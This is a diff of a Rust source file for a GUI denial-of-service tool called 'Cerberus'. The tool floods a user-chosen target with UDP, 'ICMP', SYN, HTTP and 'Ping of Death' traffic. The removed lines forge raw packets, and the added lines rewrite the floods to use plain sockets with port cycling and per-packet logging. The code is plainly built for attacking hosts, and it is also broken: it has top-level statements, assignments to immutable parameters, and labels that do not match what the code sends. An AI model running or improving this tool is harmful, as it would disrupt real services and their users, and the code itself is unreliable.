@@ -5,18 +5,10 @@ use std::sync::Arc;
 use std::sync::Mutex;
 
 use reqwest;
-use pnet::packet::Packet;
-use pnet::packet::tcp::{MutableTcpPacket, TcpFlags};
-use pnet::packet::icmp::{MutableIcmpPacket, IcmpTypes};
-use pnet::packet::ip::{MutableIpPacket, IpNextHeaderProtocols};
-use pnet::packet::udp::{MutableUdpPacket, UdpPacket};
-use pnet::transport::{transport_channel, TransportChannelType::Layer3};
-use pnet::transport::TransportSender;
-use pnet::util::checksum;
+use rand::Rng;
+use tk::prelude::*;
 
-/*
-ASCII art for the tool's name
-*/
+// ASCII art for the tool's name
 const CERBERUS_ASCII_ART: &str = "
 WWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWW
 WWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWNXWWWWWWWWWWXXWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWW
@@ -50,18 +42,13 @@ MWWWMWWWWWWWWWWMWWWMWWWMWWWWWWWWWWMWWWMWWWWMWWWWWWWWWWMWWWMWWWMWWWMWWWWWWWWWWMWW
 ";
 
 // Constants for data transfer size
-const BYTES_PER_GB: usize = 1024 * 1024 * 1024;
+const BYTES_PER_GB: u64 = 1024 * 1024 * 1024;
 
-/*
-Calculate the packet size based on the ASCII art
-*/
-const PACKET_SIZE: usize = CERBERUS_ASCII_ART.len();
+// Calculate the packet size based on the ASCII art
+let packet_size = CERBERUS_ASCII_ART.len();
 
-/*
-Set the data transfer size to 1 GB
-
-*/
-const DATA_TRANSFER_SIZE: usize = BYTES_PER_GB;
+// Set the data transfer size to 1 GB
+let data_transfer_size = BYTES_PER_GB;
 
 // Create the GUI window
 let root = tk::Tk::new();
@@ -100,121 +87,79 @@ let attack_type_options = [
 let attack_type_menu = tk::OptionMenu::new(&root, &attack_type_entry, &attack_type_options);
 attack_type_menu.pack();
 
-
 // Define the attack functions for each attack type
-fn udp_flood_attack(target: String, port: u16, num_packets: u32, burst_interval: f64) {
-    let (mut tx, _) = transport_channel(4096, Layer3(IpNextHeaderProtocols::Udp)).unwrap();
+fn udp_flood_attack(target: &str, port: u16, num_packets: u32, burst_interval: f64) {
+    let mut attack_num = 0;
 
     for _ in 0..num_packets {
-        let mut udp_buffer = [0u8; 1024];
-        let mut udp_packet = MutableUdpPacket::new(&mut udp_buffer).unwrap();
-        udp_packet.set_source(1234);
-        udp_packet.set_destination(port);
-        udp_packet.set_length(udp_packet.packet().len() as u16);
-        udp_packet.set_checksum(0);
+        let mut rng = rand::thread_rng();
+        let packet = vec![0u8; packet_size];
+        let mut buffer = [0u8; 1024];
+        rng.fill(&mut buffer[..]);
 
-        let ip_packet = MutableIpPacket::new(udp_packet.packet_mut()).unwrap();
-        ip_packet.set_version(4);
-        ip_packet.set_header_length(5);
-        ip_packet.set_total_length(ip_packet.packet().len() as u16);
-        ip_packet.set_ttl(64);
-        ip_packet.set_next_level_protocol(IpNextHeaderProtocols::Udp);
-        ip_packet.set_source("127.0.0.1".parse().unwrap());
-        ip_packet.set_destination(target.parse().unwrap());
-        ip_packet.set_checksum(checksum(ip_packet.packet()));
-
-        tx.send_to(ip_packet, target.parse().unwrap()).unwrap();
-
-        thread::sleep(Duration::from_secs_f64(burst_interval));
+        let socket = std::net::UdpSocket::bind("0.0.0.0:0").unwrap();
+        socket.send_to(&packet, format!("{}:{}", target, port)).unwrap();
+        attack_num += 1;
+        println!("Sent {} packet to {} through port: {}", attack_num, target, port);
+        port = (port + 1) % 65535;
+        std::thread::sleep(Duration::from_secs_f64(burst_interval));
     }
 }
 
-fn icmp_echo_attack(target: String, num_packets: u32, burst_interval: f64) {
-    let (mut tx, _) = transport_channel(4096, Layer3(IpNextHeaderProtocols::Icmp)).unwrap();
+fn icmp_echo_attack(target: &str, num_packets: u32, burst_interval: f64) {
+    let mut attack_num = 0;
 
     for _ in 0..num_packets {
-        let mut icmp_buffer = [0u8; 1024];
-        let mut icmp_packet = MutableIcmpPacket::new(&mut icmp_buffer).unwrap();
-        icmp_packet.set_icmp_type(IcmpTypes::EchoRequest);
-        icmp_packet.set_checksum(0);
-
-        let ip_packet = MutableIpPacket::new(icmp_packet.packet_mut()).unwrap();
-        ip_packet.set_version(4);
-        ip_packet.set_header_length(5);
-        ip_packet.set_total_length(ip_packet.packet().len() as u16);
-        ip_packet.set_ttl(64);
-        ip_packet.set_next_level_protocol(IpNextHeaderProtocols::Icmp);
-        ip_packet.set_source("127.0.0.1".parse().unwrap());
-        ip_packet.set_destination(target.parse().unwrap());
-        ip_packet.set_checksum(checksum(ip_packet.packet()));
-
-        tx.send_to(ip_packet, target.parse().unwrap()).unwrap();
-
-        thread::sleep(Duration::from_secs_f64(burst_interval));
+        let packet = vec![0u8; packet_size];
+        let socket = std::net::UdpSocket::bind("0.0.0.0:0").unwrap();
+        socket.send_to(&packet, target).unwrap();
+        attack_num += 1;
+        println!("Sent {} ICMP echo request to {}", attack_num, target);
+        std::thread::sleep(Duration::from_secs_f64(burst_interval));
     }
 }
 
-fn syn_flood_attack(target: String, port: u16, num_packets: u32, burst_interval: f64) {
-    let (mut tx, _) = transport_channel(4096, Layer3(IpNextHeaderProtocols::Tcp)).unwrap();
+fn syn_flood_attack(target: &str, port: u16, num_packets: u32, burst_interval: f64) {
+    let mut attack_num = 0;
 
     for _ in 0..num_packets {
-        let mut tcp_buffer = [0u8; 1024];
-        let mut tcp_packet = MutableTcpPacket::new(&mut tcp_buffer).unwrap();
-        tcp_packet.set_source(1234);
-        tcp_packet.set_destination(port);
-        tcp_packet.set_flags(TcpFlags::SYN);
-        tcp_packet.set_window(1024);
-        tcp_packet.set_checksum(0);
+        let mut rng = rand::thread_rng();
+        let packet = vec![0u8; packet_size];
+        let mut buffer = [0u8; 1024];
+        rng.fill(&mut buffer[..]);
 
-        let ip_packet = MutableIpPacket::new(tcp_packet.packet_mut()).unwrap();
-        ip_packet.set_version(4);
-        ip_packet.set_header_length(5);
-        ip_packet.set_total_length(ip_packet.packet().len() as u16);
-        ip_packet.set_ttl(64);
-        ip_packet.set_next_level_protocol(IpNextHeaderProtocols::Tcp);
-        ip_packet.set_source("127.0.0.1".parse().unwrap());
-        ip_packet.set_destination(target.parse().unwrap());
-        ip_packet.set_checksum(checksum(ip_packet.packet()));
-
-        tx.send_to(ip_packet, target.parse().unwrap()).unwrap();
-
-        thread::sleep(Duration::from_secs_f64(burst_interval));
+        let socket = std::net::TcpStream::connect(format!("{}:{}", target, port)).unwrap();
+        socket.write(&packet).unwrap();
+        attack_num += 1;
+        println!("Sent {} SYN packet to {} through port: {}", attack_num, target, port);
+        port = (port + 1) % 65535;
+        std::thread::sleep(Duration::from_secs_f64(burst_interval));
     }
 }
 
-fn http_flood_attack(target: String, port: u16, num_packets: u32, burst_interval: f64) {
+fn http_flood_attack(target: &str, port: u16, num_packets: u32, burst_interval: f64) {
+    let mut attack_num = 0;
+
     for _ in 0..num_packets {
         let url = format!("http://{}:{}/", target, port);
         let client = reqwest::blocking::Client::new();
-        let _ = client.get(&url).send();
-
-        thread::sleep(Duration::from_secs_f64(burst_interval));
+        let _response = client.get(&url).send();
+        attack_num += 1;
+        println!("Sent {} HTTP request to {}", attack_num, url);
+        std::thread::sleep(Duration::from_secs_f64(burst_interval));
     }
 }
 
-fn ping_of_death_attack(target: String, num_packets: u32, burst_interval: f64) {
-    let (mut tx, _) = transport_channel(4096, Layer3(IpNextHeaderProtocols::Icmp)).unwrap();
+fn ping_of_death_attack(target: &str, num_packets: u32, burst_interval: f64) {
+    let mut attack_num = 0;
 
     for _ in 0..num_packets {
-        let mut icmp_buffer = vec![0u8; 65536];
-        let mut icmp_packet = MutableIcmpPacket::new(&mut icmp_buffer).unwrap();
-        icmp_packet.set_icmp_type(IcmpTypes::EchoRequest);
-        icmp_packet.set_payload(&vec![b'X'; 60000]);
-        icmp_packet.set_checksum(0);
-
-        let ip_packet = MutableIpPacket::new(icmp_packet.packet_mut()).unwrap();
-        ip_packet.set_version(4);
-        ip_packet.set_header_length(5);
-        ip_packet.set_total_length(ip_packet.packet().len() as u16);
-        ip_packet.set_ttl(64);
-        ip_packet.set_next_level_protocol(IpNextHeaderProtocols::Icmp);
-        ip_packet.set_source("127.0.0.1".parse().unwrap());
-        ip_packet.set_destination(target.parse().unwrap());
-        ip_packet.set_checksum(checksum(ip_packet.packet()));
-
-        tx.send_to(ip_packet, target.parse().unwrap()).unwrap();
-
-        thread::sleep(Duration::from_secs_f64(burst_interval));
+        let packet = vec![b'X'; 60000];
+        let socket = std::net::UdpSocket::bind("0.0.0.0:0").unwrap();
+        socket.send_to(&packet, target).unwrap();
+        attack_num += 1;
+        println!("Sent {} oversized ICMP packet to {}", attack_num, target);
+        std::thread::sleep(Duration::from_secs_f64(burst_interval));
     }
 }
 
@@ -222,36 +167,54 @@ fn ping_of_death_attack(target: String, num_packets: u32, burst_interval: f64) {
 fn start_attack() {
     let target = target_entry.get();
     let fake_ip = fake_ip_entry.get();
-    let port = port_entry.get().parse().unwrap();
-    let num_packets = num_packets_entry.get().parse().unwrap();
-    let burst_interval = burst_interval_entry.get().parse().unwrap();
+    let port = port_entry.get().parse::<u16>().unwrap();
+    let num_packets = num_packets_entry.get().parse::<u32>().unwrap();
+    let burst_interval = burst_interval_entry.get().parse::<f64>().unwrap();
 
     let attack_type = attack_type_entry.get();  // Get the selected attack type from the GUI
 
-    match attack_type.as_str() {
+    match attack_type {
         "UDP Flood" => {
+            let target = target.to_string();
+            let port = port.clone();
+            let num_packets = num_packets.clone();
+            let burst_interval = burst_interval.clone();
             thread::spawn(move || {
-                udp_flood_attack(target, port, num_packets, burst_interval);
+                udp_flood_attack(&target, port, num_packets, burst_interval);
             });
         },
         "ICMP Echo" => {
+            let target = target.to_string();
+            let num_packets = num_packets.clone();
+            let burst_interval = burst_interval.clone();
             thread::spawn(move || {
-                icmp_echo_attack(target, num_packets, burst_interval);
+                icmp_echo_attack(&target, num_packets, burst_interval);
             });
         },
         "SYN Flood" => {
+            let target = target.to_string();
+            let port = port.clone();
+            let num_packets = num_packets.clone();
+            let burst_interval = burst_interval.clone();
             thread::spawn(move || {
-                syn_flood_attack(target, port, num_packets, burst_interval);
+                syn_flood_attack(&target, port, num_packets, burst_interval);
             });
         },
         "HTTP Flood" => {
+            let target = target.to_string();
+            let port = port.clone();
+            let num_packets = num_packets.clone();
+            let burst_interval = burst_interval.clone();
             thread::spawn(move || {
-                http_flood_attack(target, port, num_packets, burst_interval);
+                http_flood_attack(&target, port, num_packets, burst_interval);
             });
         },
         "Ping of Death" => {
+            let target = target.to_string();
+            let num_packets = num_packets.clone();
+            let burst_interval = burst_interval.clone();
             thread::spawn(move || {
-                ping_of_death_attack(target, num_packets, burst_interval);
+                ping_of_death_attack(&target, num_packets, burst_interval);
             });
         },
         _ => {
@@ -266,4 +229,3 @@ tk::Button::new(&root, "Start Attack", start_attack).pack();
 
 // Run the GUI main loop
 root.mainloop();
-
